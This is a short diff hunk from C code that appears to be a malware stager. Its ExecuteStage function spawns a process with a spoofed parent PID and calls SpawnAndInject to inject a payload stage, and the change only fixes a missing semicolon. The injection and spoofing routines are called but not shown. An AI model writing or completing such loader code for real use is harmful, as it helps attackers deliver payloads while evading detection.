@@ -155,7 +155,7 @@ VOID ExecuteStage(CHAR* Stage, DWORD sSize)
         ChildProcess = GetParentHandle(&hProcess);
 
         // spawn the ppid spoofed process
-        SpawnAndInject(hProcess, ChildProcess, &cProc, &cThread, Stage, sSize)
+        SpawnAndInject(hProcess, ChildProcess, &cProc, &cThread, Stage, sSize);
     #endif
 
     return;
